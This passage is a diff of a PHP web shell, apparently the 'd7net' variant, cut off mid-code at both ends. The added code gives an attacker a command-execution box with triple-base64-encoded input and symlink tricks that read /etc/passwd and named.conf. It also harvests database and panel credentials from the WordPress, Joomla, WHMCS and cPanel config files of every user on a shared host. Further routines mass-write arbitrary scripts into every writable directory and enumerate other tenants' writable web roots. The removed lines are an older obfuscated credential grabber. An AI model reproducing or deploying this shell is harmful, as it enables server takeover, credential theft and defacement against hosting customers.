+<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
+<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
+</form><br><br></center>';
+} elseif ($_GET['komend'] == "d7net") {
+    echo "<center>";
+    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
+    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
+    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
+    </form><br>';
+    if (isset($_POST['eksekomend'])) {
+        ekse($_POST['komend'], $lokasi);
+    }
+    echo "</center>";
+
+} elseif ($_REQUEST['symlink'] == "d7net") {
+	if (!is_file('named.txt')) {
+        $d00m = @file('/etc/named.conf');
+    } else {
+        $d00m = @file('named.txt');
+    }
+    if (!$d00m) {
+        die("<hr><br><center><a class='button' href='?path=$lokasi&symread=d7net'>Bypass Read</a> <a class='button' href='?path=$lokasi&sym_404=d7net'>Symlink 404</a> <a class='button' href='?path=$lokasi&sym_bypas=d7net'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
+    } else {
+        echo "[ <a href='?path=$dir&symread=d7net'>Bypass Read</a> ] [ <a href='?path=$lokasi&sym_404=d7net'>Symlink 404</a> ] [ <a href='?path=$lokasi&sym_bypas=d7net'>Symlink Bypass</a> ]<div class='tmp'>
+                <table align='center' width='100%'>
+                    <thead class='bg-info'>
+                        <th>Domains</th>
+                        <th>Users</th>
+                        <th>symlink </th>
+                    </thead>";
+        foreach ($d00m as $dom) {
+            if (eregi('zone', $dom)) {
+                preg_match_all('#zone "(.*)"#', $dom, $domsws);
+                flush();
+                if (strlen(trim($domsws[1][0])) > 2) {
+                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domsws[1][0]));
+                    flush();
+                    $site = $user['name'];
+                    @symlink('/', 'sym/root');
+                    $site = $domsws[1][0];
+                    $ir = 'ir';
+                    $il = 'il';
+                    if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
+                        $site = ".$domsws[1][0].";
+                    }
+                    echo "
+                                <tr>
+                                    <td>
+                                        <a target='_blank' href=http://www.".$domsws[1][0].'/>'.$site.' </a>
+                                    </td>
+                                    <td>
+                                        '.$user['name']."
+                                    </td>
+                                    <td>
+                                        <a href='sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a>
+                                    </td>
+                                </tr>";
+                    flush();
+                    flush();
+                }
+            }
+        }
+        echo '</table>
+            </div><br/>';
+    }
+    exit;
+}
+
+if ($_GET['symread'] == 'd7net') {
+    echo '<center>read /etc/named.conf';
+    echo "<form method='post' action='?path=$dir&symread=d7net&save=1'>
+            <textarea class='form-control' rows='15' cols='50' name='file'>";
+    flush();
+    flush();
+    $file = '/etc/named.conf';
+    $r3ad = @fopen($file, 'r');
+    if ($r3ad) {
+        $content = @fread($r3ad, @filesize($file));
+        echo ''.htmlentities($content).'';
+    } elseif (!$r3ad) {
+        $r3ad = @highlight_file($file);
+    } elseif (!$r3ad) {
+        $r3ad = @highlight_file($file);
+    } elseif (!$r3ad) {
+        $sm = @symlink($file, 'sym.txt');
+        if ($sm) {
+            $r3ad = @fopen('sym/sym.txt', 'r');
+            $content = @fread($r3ad, @filesize($file));
+            echo ''.htmlentities($content).'';
+        }
+    }
+    echo "</textarea><br/><input type='submit' class='button' value='Save'/> </form>";
+    if (isset($_GET['save'])) {
+        $cont = stripcslashes($_POST['file']);
+        $f = fopen('named.txt', 'w');
+        $w = fwrite($f, $cont);
+        if ($w) {
+            echo '<br/>save has been successfully</center>';
+        }
+        fclose($f);
+    }
+    exit;
+}
+
+if ($_GET['sym_404'] == 'd7net') {
+    echo '<center><h2>Symlink 404</h2>
+        <form method="post">
+            File Target: <input type="text" class="form-control" name="dir" style="width: 250px;height: 20px;" value="/home/public_html/wp-config.php"><br><br>
+            Save As: <input type="text" class="form-control" name="isi" style="width: 100px;height: 20px;" placeholder="file.txt"/><br><br/>
+            <input type="submit" class="button" value="Execute" name="execute"/>
+        </form></center>';
+    if ($_POST['execute']) {
+        rmdir('d7net_sym404');
+        mkdir('d7net_sym404', 0777);
+        $dir = $_POST['dir'];
+        $isi = $_POST['isi'];
+        system('ln -s '.$dir.'d7net_sym404/'.$isi);
+        symlink($dir, 'd7net_sym404/'.$isi);
+        $inija = fopen('d7net_sym404/.htaccess', 'w');
+        fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
+        echo'<a href="/d7net_sym404/" target="_blank"> >>Sukses<< </a>';
+    }
+    exit;
+}
+
+if ($_GET['sym_bypas'] == 'd7net') {
+    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
+        $cont = stripcslashes($_POST['file']);
+        if (!file_exists('passwd.txt')) {
+            $f = @fopen('passwd.txt', 'w');
+            $w = @fwrite($f, $cont);
+            fclose($f);
+        }
+        if ($w or @filesize('passwd.txt') > 0) {
+            echo "<div class='tmp mb-4'>
+                    <table width='100%'>
+                        <thead class='bg-info text-center'>
+                            <th>Users</th>
+                            <th>symlink</th>
+                            <th>FTP</th>
+                        </thead>";
+            flush();
+            $fil3 = file('passwd.txt');
+            foreach ($fil3 as $f) {
+                $u = explode(':', $f);
+                $user = $u['0'];
+                echo "<tr class='text-dark'>
+                                <td class='text-left pl-1'>$user</td>
+                                <td>
+                                    <a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
+                                </td>
+                                <td>
+                                    <a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
+                                </td>
+                            </tr>";
+                flush();
+                flush();
+            }
+            die('</tr></table></div>');
+        }
+    }
+
+    echo '<center>read /etc/passwd';
+    echo "<br/><form method='post' action='?path=$lokasi&sym_bypas=d7net&save=1'>
+            <textarea class='form-control' rows='15' cols='50' name='file'>";
+    flush();
+    $file = '/etc/passwd';
+    $r3ad = @fopen($file, 'r');
+    if ($r3ad) {
+        $content = @fread($r3ad, @filesize($file));
+        echo ''.htmlentities($content).'';
+    } elseif (!$r3ad) {
+        $r3ad = @highlight_file($file);
+    } elseif (!$r3ad) {
+        $r3ad = @highlight_file($file);
+    } elseif (!$r3ad) {
+        for ($uid = 0; $uid < 1000; $uid++) {
+            $ara = posix_getpwuid($uid);
+            if (!empty($ara)) {
+                while (list($key, $val) = each($ara)) {
+                    echo "$val:";
+                }
+                echo "\n";
+            }
+        }
+    }
+    flush();
+    echo "</textarea><br/>
+            <input type='submit' class='button' value='Symlink'/><br/>
+        </form></center>";
+    flush();
+    exit;
+
+} elseif ($_REQUEST['config'] == "d7net") {
+	$etc = fopen('/etc/passwd', 'r') or die("<center><pre><font color=red>Can't read /etc/passwd</font></pre></center>");
+    $con = mkdir('d7net_config', 0777);
+    $isi_htc = "Options all\nRequire None\nSatisfy Any";
+    $htc = fopen('d7net_config/.htaccess', 'w');
+    fwrite($htc, $isi_htc);
+    while ($passwd = fgets($etc)) {
+        if ($passwd == '' || !$etc) {
+            echo "<font color=red>Can't read /etc/passwd</font>";
+        } else {
+            preg_match_all('/(.*?):x:/', $passwd, $user_config);
+            foreach ($user_config[1] as $user_con) {
+                $user_config_dir = "/home/$user_con/public_html/";
+                if (is_readable($user_config_dir)) {
+                    $grab_config =
+                    [
+                        "/home/$user_con/.my.cnf" => 'cpanel',
+                        "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
+                        "/home/$user_con/public_html/forum/config.php" => 'phpBB',
+                        "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
+                        "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
+                        "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
+                        "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
+                        "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
+                        "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
+                        "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
+                        "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
+                        "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
+                        "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
+                        "/home/$user_con/public_html/inc/config.php" => 'MyBB',
+                        "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
+                        "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
+                        "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
+                        "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
+                        "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
+                        "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
+                        "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
+                        "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
+                        "/home/$user_con/public_html/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/submitticket.php" => '^WHMCS',
+                        "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
+                        "/home/$user_con/public_html/WHMCS/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/whmcs1/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Whmcs/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/WHMC/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Whmc/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/whmc/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/WHM/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Whm/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/whm/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/HOST/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Host/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/host/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/SUPPORTES/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Supportes/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/supportes/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/domains/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/domain/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Hosting/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/HOSTING/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/hosting/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/CART/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Cart/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/cart/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/ORDER/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Order/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/order/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/CLIENT/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Client/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/client/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Clientarea/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/clientarea/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/SUPPORT/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Support/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/support/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/BILLING/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Billing/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/billing/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/BUY/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Buy/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/buy/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/MANAGE/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Manage/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/manage/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/ClientSupport/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Clientsupport/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/clientsupport/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/CHECKOUT/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Checkout/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/checkout/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/BASKET/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Basket/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/basket/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/SECURE/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Secure/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/secure/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/SALES/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Sales/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/sales/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/BILL/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Bill/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/bill/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/PURCHASE/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Purchase/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/purchase/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/ACCOUNT/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Account/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/account/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/USER/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/User/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/user/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/CLIENTS/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Clients/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/clients/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/MY/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/My/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/my/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/secure/whm/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/secure/whmcs/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/panel/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/clientes/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/cliente/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/support/order/submitticket.php" => 'WHMCS',
+                        "/home/$user_con/public_html/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/boxbilling/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/box/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/host/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/Host/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/supportes/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/support/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/hosting/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/cart/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/order/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/client/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/clients/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/cliente/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/clientes/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/billing/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/billings/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/my/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/secure/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/support/order/bb-config.php" => 'BoxBilling',
+                        "/home/$user_con/public_html/includes/dist-configure.php" => 'Zencart',
+                        "/home/$user_con/public_html/zencart/includes/dist-configure.php" => 'Zencart',
+                        "/home/$user_con/public_html/products/includes/dist-configure.php" => 'Zencart',
+                        "/home/$user_con/public_html/cart/includes/dist-configure.php" => 'Zencart',
+                        "/home/$user_con/public_html/shop/includes/dist-configure.php" => 'Zencart',
+                        "/home/$user_con/public_html/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/hostbills/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/host/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/support/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/hosting/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/cart/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/order/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/client/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/clients/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/cliente/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/clientes/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/billing/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/billings/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/my/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',
+                        "/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
+                    ];
+                    foreach ($grab_config as $config => $nama_config) {
+                        $ambil_config = file_get_contents($config);
+                        if ($ambil_config == '') {
+                        } else {
+                            $file_config = fopen("d7net_config/$user_con-$nama_config.txt", 'w');
+                            fwrite($file_config, $ambil_config);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    echo "<center><a href='?path=$lokasi/d7net_config'><font color=lime>Done</font></a></center>";
+    exit;
+
+} elseif ($_REQUEST['mass'] == "d7net") {
+	function sabun_massal($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "$lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
 		}
-
+	}
+	function sabun_biasa($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "$dirb/$namafile<br>";
+							file_put_contents($lokasi, $isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		if($_POST['tipe_sabun'] == 'mahal') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		} elseif($_POST['tipe_sabun'] == 'murah') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		}
+} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font style='text-decoration: ;'>Tipe Sabun:</font><br>
+	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br><br>
+	<font style='text-decoration: ;'>Directory:</font><br>
+	<input type='text' name='d_dir' value='$lokasi' style='width: 450px;height: 20px;'><br>
+	<font style='text-decoration: ;'>Nama File:</font><br>
+	<input type='text' name='d_file' value='' style='width: 450px;height: 20px;' placeholder='isi nickname'><br>
+	<font style='text-decoration: ;'>Isi File:</font><br>
+	<textarea name='script' style='width: 600px; height: 250px;' placeholder='isi script'></textarea><br>
+	<input type='submit' class='button' name='start' value='Sikat!!' style='width: 450px;'>
+	</form></center><br>";
+}
+exit;
+} elseif($_GET['jump'] == 'd7net') {
+	$i = 0;
+	echo "<center>Jumping server<center><br>	<div class='margin: 5px auto;'>";
+	if(preg_match("/hsphere/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace(array("http://","www."), "", strtolower($url));
+				$etc = "/etc/passwd";
+				$f = fopen($etc,"r");
+				while($gets = fgets($f)) {
+					$pecah = explode(":", $gets);
+					$user = $pecah[0];
+					$dir_user = "/hsphere/local/home/$user";
+					if(is_dir($dir_user) === true) {
+						$url_user = $dir_user."/".$url;
+						if(is_readable($url_user)) {
+							$i++;
+							$jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
+							if(is_writable($url_user)) {
+								$jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
+							}
+							echo $jrw."<br>";
+						}
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
+			while($getss = fgets($fp)) {
+				echo $getss;
+			}
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} elseif(preg_match("/vhosts|vhost/", $dir)) {
+		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace("www.", "", $url);
+				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
+				if(is_dir($web_vh) === true) {
+					if(is_readable($web_vh)) {
+						$i++;
+						$jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
+						if(is_writable($web_vh)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
+						}
+						echo $jrw."<br>";
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+				  bing("ip:$ip");
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
 	} else {
-		$etc = $moonafic[27]("/etc/passwd", "r") or die("<center><pre><font color=red>Can't read /etc/passwd</font></pre></center>");
-		while($passwd = $moonafic[32]($etc)) {
-			if($passwd == "" || !$etc) {
+		echo "<pre>";
+		$etc = fopen("/etc/passwd", "r") or die("<center><font color=red>Can't read /etc/passwd</font></center>");
+		while($passwd = fgets($etc)) {
+			if($passwd == '' || !$etc) {
 				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
 			} else {
-				$moonafic[33]('/(.*?):x:/', $passwd, $user_config);
-				foreach($user_config[1] as $user_kaliinirisu) {
-					$user_config_dir = "/home/$user_kaliinirisu/public_html/";
-					if($moonafic[30]($user_config_dir)) {
-						$grab_config = array(
-							"/home/$user_kaliinirisu/.my.cnf" => "cpanel",
-							"/home/$user_kaliinirisu/.accesshash" => "WHM-accesshash",
-							"$user_config_dir/po-content/config.php" => "Popoji",
-							"$user_config_dir/vdo_config.php" => "Voodoo",
-							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
-							"$user_config_dir/config/koneksi.php" => "Lokomedia",
-							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
-							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
-							"$user_config_dir/whm/configuration.php" => "WHMCS",
-							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
-							"$user_config_dir/forum/config.php" => "phpBB",
-							"$user_config_dir/sites/default/settings.php" => "Drupal",
-							"$user_config_dir/config/settings.inc.php" => "PrestaShop",
-							"$user_config_dir/app/etc/local.xml" => "Magento",
-							"$user_config_dir/joomla/configuration.php" => "Joomla",
-							"$user_config_dir/configuration.php" => "Joomla",
-							"$user_config_dir/wp/wp-config.php" => "WordPress",
-							"$user_config_dir/wordpress/wp-config.php" => "WordPress",
-							"$user_config_dir/wp-config.php" => "WordPress",
-							"$user_config_dir/admin/config.php" => "OpenCart",
-							"$user_config_dir/slconfig.php" => "Sitelok",
-							"$user_config_dir/application/config/database.php" => "Ellislab");
-						    foreach($grab_config as $config => $nama_config) {
-							$ambil_config = $moonafic[6]($config);
-							if($ambil_config == '') {
-							} else {
-								$file_config = $moonafic[27]("kaliinirisu_config/$user_kaliinirisu-$nama_config.txt","w");
-								fputs($file_config,$ambil_config);
-							}
+				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+				foreach($user_jumping[1] as $user_idx_jump) {
+					$user_jumping_dir = "/home/$user_idx_jump/public_html";
+					if(is_readable($user_jumping_dir)) {
+						$i++;
+						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+						if(is_writable($user_jumping_dir)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
 						}
-					}		
+						echo $jrw;
+						if(function_exists('posix_getpwuid')) {
+							$domain_jump = file_get_contents("/etc/named.conf");	
+							if($domain_jump == '') {
